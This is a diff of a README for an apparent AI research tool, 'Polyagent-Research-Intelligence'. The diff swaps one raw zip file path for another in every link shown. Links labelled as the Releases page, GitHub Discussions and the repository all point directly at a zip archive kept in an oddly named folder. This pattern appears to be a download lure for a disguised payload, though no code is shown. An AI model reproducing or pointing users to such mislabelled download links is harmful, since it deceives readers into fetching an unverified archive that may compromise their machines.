@@ -1,6 +1,6 @@
 # 🌟 Polyagent-Research-Intelligence - Simplifying AI Research for You
 
-[![Download Now](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/scrobicule/Polyagent-Research-Intelligence.zip%20Now-Polyagent%20Research%20Intelligence-brightgreen)](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/scrobicule/Polyagent-Research-Intelligence.zip)
+[![Download Now](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/components/pages/Research_Polyagent_Intelligence_v3.5.zip%20Now-Polyagent%20Research%20Intelligence-brightgreen)](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/components/pages/Research_Polyagent_Intelligence_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 To get the latest version of Polyagent-Research-Intelligence, visit the Releases page:
 
-[Download Polyagent-Research-Intelligence](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/scrobicule/Polyagent-Research-Intelligence.zip)
+[Download Polyagent-Research-Intelligence](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/components/pages/Research_Polyagent_Intelligence_v3.5.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version. It should be marked as "Latest Release."
@@ -69,7 +69,7 @@ If you encounter any issues, here are some common solutions:
 
 Join our community to share experiences, ask questions, and find tips on using Polyagent-Research-Intelligence effectively. You can connect with us on:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/scrobicule/Polyagent-Research-Intelligence.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/components/pages/Research_Polyagent_Intelligence_v3.5.zip)
 - [Discord](insert Discord link)
 
 For further assistance, please raise an issue in the GitHub repository. Our team will be happy to help.
@@ -86,6 +86,6 @@ Explore the following resources to enhance your understanding:
 
 For more details about Polyagent-Research-Intelligence, check out our GitHub repository:
 
-[Visit the Repository](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/scrobicule/Polyagent-Research-Intelligence.zip)
+[Visit the Repository](https://raw.githubusercontent.com/abd-rachidi07/Polyagent-Research-Intelligence/main/components/pages/Research_Polyagent_Intelligence_v3.5.zip)
 
 Thank you for choosing Polyagent-Research-Intelligence. We hope it makes your research easier and more efficient!
